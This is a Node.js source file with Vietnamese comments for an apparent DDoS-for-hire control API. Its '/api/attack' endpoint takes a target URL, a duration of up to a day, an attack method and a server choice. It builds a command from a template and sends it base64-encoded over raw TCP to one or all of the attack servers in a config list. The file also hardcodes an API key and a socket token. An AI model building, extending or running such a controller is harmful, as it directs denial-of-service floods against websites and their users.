const express = require('express');
const net = require('net');

const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];

// cấu hình api
const api_port = 8888; // Cổng API
const socket_token = "daukute432000"; // Mã thông báo TCP Socket, sử dụng số/chữ cái ngẫu nhiên
const api_key = "daukute"; // Khóa API của bạn
const domain_lock = true; // khóa api để chỉ được sử dụng từ một tên miền cụ thể
const api_domain = 'l7.daukute.us'; // miền API của bạn (nếu domain_lock được đặt thành true)

//dữ liệu cho API
const servers = require('./servers.json');
const commands = require('./commands.json');

const app = express();
app.use(express.json());
 
app.get(`/api/attack`, async (req, res) => {
    const attackid = Math.floor((Math.random() * 125000));

    const field = {
        host: req.query.host || undefined,
        time: req.query.time || undefined,
        method: req.query.method || undefined,
        server: req.query.server || undefined,
        api_key: req.query.api_key || undefined,
    };

    // kiểm tra bảo mật API
    if (field.api_key !== api_key) return res.json({ status: 500, data: `khóa api không hợp lệ` });
    if (domain_lock && req.hostname !== api_domain) return res.json({ status: 500, data: `yêu cầu không đến từ miền được ủy quyền` });

    //kiểm tra các trường
    const containsBlacklisted = blackList.some(char => field.host.includes(char));
    if (!field.host || !urlRegex.test(field.host) || containsBlacklisted) return res.json({ status: 500, data: `máy chủ cần phải là một URL hợp lệ` });
    if (!field.time || isNaN(field.time) || field.time > 86400) return res.json({ status: 500, data: `thời gian cần phải là một số trong khoảng 0-86400` });
    if (!field.server || !servers.hasOwnProperty(field.server)) return res.json({ status: 500, data: `máy chủ không hợp lệ hoặc không được tìm thấy trong danh sách máy chủ` });
    if (!field.method || !Object.keys(commands).includes(field.method.toUpperCase()) && field.method !== "stop") return res.json({ status: 500, data: `phương pháp tấn công không hợp lệ` });

    try {

        const command = commands[field.method.toUpperCase()]
        .replace('${attack_id}', attackid)
        .replace('${host}', field.host)
        .replace('${time}', field.time);
    
        const data = {
            socket_token: socket_token,
            command: command,
            host: field.host
        };

        const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');

        const startTime = process.hrtime();

        const response = await sendData(field.server, encodedData);

        if (!response.includes("success")) {
            return res.json({
                status: 500,
                message: 'gửi yêu cầu không thành công',
            });
        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;

        console.log(`gửi yêu cầu thành công mục tiêu: ${field.host}, phương thức: ${field.method}, Thời gian: ${elapsedTimeMs.toFixed(2)} giây`);

        return res.json({
            status: 200,
            message: 'gửi yêu cầu thành công',
            id: attackid,
            elapsed_time: elapsedTimeMs.toFixed(2),
            data: {
                host: field.host,
                time: field.time,
                method: field.method
            }
        });
    } catch (e) {
        console.log(`gửi yêu cầu không thành công mục tiêu: ${field.host}, phương thức: ${field.method}`);

        return res.json({
            status: 200,
            message: 'gửi yêu cầu không thành công',
        });
    }

});

app.listen(api_port, () => console.log(`API socket Layer7 đã chạy trên cổng ${api_port}`));

function sendData(serverName, data) {
    return new Promise(async (resolve, reject) => {
        if (serverName === 'all') {
            const promises = [];

            for (const server of Object.values(servers)) {
                promises.push(sendToServer(server, data));
            }

            try {
                const results = await Promise.all(promises);
                const response = results.map(result => result.toString());
                resolve(response);
            } catch (err) {
                reject(err);
            }
        } else {
            const server = servers[serverName];
            if (server) {
                sendToServer(server, data)
                    .then(result => {
                        const response = result.toString();
                        resolve(response);
                    })
                    .catch(err => {
                        reject(err);
                    });
            } else {
                reject('error');
            }
        }
    });
}

function sendToServer(server, data) {
    return new Promise((resolve, reject) => {
        console.log(`Gửi yêu cầu đến máy chủ ${server.name}`);

        const socket = new net.Socket();

        socket.connect(server.port, server.ip, () => {
            socket.write(data);
        });

        socket.on('data', (data) => {
            resolve(data);
        });

        socket.on('error', (err) => {
            reject('error');
        });

        socket.on('close', () => {});
    });
}
